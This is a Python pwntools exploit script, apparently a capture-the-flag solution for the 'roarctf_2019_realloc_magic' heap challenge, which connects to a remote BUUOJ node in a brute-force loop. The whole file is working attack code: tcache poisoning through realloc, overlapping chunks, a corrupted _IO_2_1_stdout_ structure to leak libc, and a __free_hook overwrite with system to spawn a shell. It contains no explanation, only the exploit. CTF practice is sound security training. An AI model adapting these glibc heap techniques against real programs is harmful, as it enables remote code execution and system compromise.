from pwn import *

#r = remote("node3.buuoj.cn", 25009)
#r = process("./roarctf_2019_realloc_magic")


elf = ELF("./roarctf_2019_realloc_magic")
libc = ELF('./libc-2.27.so')

def realloc(size, content):
	r.recvuntil(">> ")
	r.sendline('1')
	r.recvuntil("Size?\n")
	r.sendline(str(size))
	r.recvuntil("Content?\n")
	r.send(content)

def delete():
	r.recvuntil(">> ")
	r.sendline('2')

def back():
	r.recvuntil(">> ")
	r.sendline('666')


def pwn():
    realloc(0x70,'a')
    realloc(0,'')
    realloc(0x100,'b')
    realloc(0,'')
    realloc(0xa0,'c')
    realloc(0,'')

    realloc(0x100,'b')
    [delete() for i in range(7)] #fill tcache
    realloc(0,'') #to unsortbin fd->arena
    realloc(0x70,'a')
    realloc(0x180,'c'*0x78+p64(0x41)+p8(0x60)+p8(0x87))#overlap

    realloc(0,'')
    realloc(0x100,'a')
    realloc(0,'')
    realloc(0x100,p64(0xfbad1887)+p64(0)*3+p8(0x58))#get _IO_2_1_stdout_  change flag and write_base

    #get_libc
    libc_base = u64(r.recvuntil("\x7f",timeout=0.1)[-6:].ljust(8,'\x00'))-0x3e82a0 # _IO_2_1_stderr_+216 store _IO_file_jumps
    if libc_base == -0x3e82a0:
        exit(-1)
    print(hex(libc_base))
    free_hook=libc_base+libc.sym['__free_hook']
    system = libc_base + libc.sym['system']
    one_gadget=libc_base + 0x4f322

    r.sendline('666')
    realloc(0x120,'a')
    realloc(0,'')
    realloc(0x130,'a')
    realloc(0,'')
    realloc(0x170,'a')
    realloc(0,'')

    realloc(0x130,'a')
    [delete() for i in range(7)]
    realloc(0,'')

    realloc(0x120,'a')
    realloc(0x260,'a'*0x128+p64(0x41)+p64(free_hook-8))
    realloc(0,'')
    realloc(0x130,'a')
    realloc(0,'')
    realloc(0x130,'/bin/sh\x00'+p64(system))
    delete()

    r.interactive()


if __name__ == "__main__":
    while True:
        r = remote("node3.buuoj.cn", 29854)
        try:
            pwn()
        except:
            r.close()
    

